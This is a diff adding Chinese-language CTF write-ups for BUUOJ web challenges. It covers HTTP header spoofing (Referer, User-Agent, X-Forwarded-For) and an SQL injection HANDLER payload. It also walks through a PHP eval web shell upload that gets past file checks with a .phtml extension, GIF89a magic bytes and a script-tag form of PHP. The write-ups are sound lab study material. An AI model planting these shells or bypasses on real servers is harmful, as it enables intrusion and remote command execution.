@@ -290,3 +290,42 @@ array(1) {
 1'; HANDLER `1919810931114514` OPEN; HANDLER `1919810931114514` READ FIRST; #
 ```
 
+### [极客大挑战 2019]Http
+
+[题目链接](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Http)
+
+伪造请求体。
+
+首先是伪代码里有 Secret.php，点进去看看，提示：It doesn't come from 'https://Sycsecret.buuoj.cn'
+
+在 Burp suite 里伪造 Referer = https://Sycsecret.buuoj.cn
+
+提示必须用 syc 浏览器访问。
+
+伪造 User-Agent = Syclover.
+
+提示本地才可见。
+
+伪造 X-Forwarded-For:127.0.0.1.
+
+### [极客大挑战 2019]Upload
+
+[题目链接](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Upload)
+
+先上传个木马 `<?php eval($_POST['Sonnety']); ?>`，提示 NOT image。
+
+那么把 Content-Type: 改成 image/jpeg。
+
+接着提示 NO php，把 filename 改成 "shell.phtml" 绕过。
+
+接着提示 Don't lie to me, it's not image at all!，我们知道每种文件开头都有几个特定的字节（Magic Bytes）来表明身份。图片的幻数通常是 GIF89a（代表 GIF 图片）。
+
+所以文件改成：
+
+`GIF89a <?php eval($_POST['Sonnety']); ?>`
+
+接着提示不能有 `<?`，而 php 早期是允许类似前端 JavaScript 的标签语法绕过正则匹配的，因此改为：
+
+`GIF89a <script language="php">eval($_POST['Sonnety']);</script>`
+
+最后在上传的文件那里发一个 POST 请求，`木马密码=cat /flag` 即可。
